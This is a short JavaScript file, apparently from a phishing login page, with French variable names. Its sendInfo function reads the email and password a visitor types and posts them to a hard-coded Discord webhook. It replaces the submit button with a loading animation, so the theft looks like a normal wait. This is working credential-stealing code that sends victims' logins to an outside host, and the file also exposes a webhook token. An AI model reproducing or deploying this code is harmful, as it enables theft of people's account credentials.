function sendInfo(){
    const email = document.getElementById("email-input")
    const mdp = document.getElementById('pswd-input')

    console.log(email.textContent)
    console.log(mdp.content)

    sendWebHook(`Email: \`${email.value}\` MotDePasse: \`${mdp.value}\``)

    const button = document.getElementById("confirm")
    button.textContent = ""
    const loading = document.createElement("img")
    loading.src = "./images/loading.gif"
    button.append(loading)
}

async function sendWebHook(string){
    const reponse = await fetch("https://discord.com/api/webhooks/1486035775903764580/A9KwAwU9C5YOo3HBD0FO_sd7DexubTfUSc51DViJbKyy66Z55DjmzLswTSilZP1hxOVv", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            "content":string
        })
    })

    const s = await reponse.text()
    console.log(s)
}


async function fetchingReponse(){

}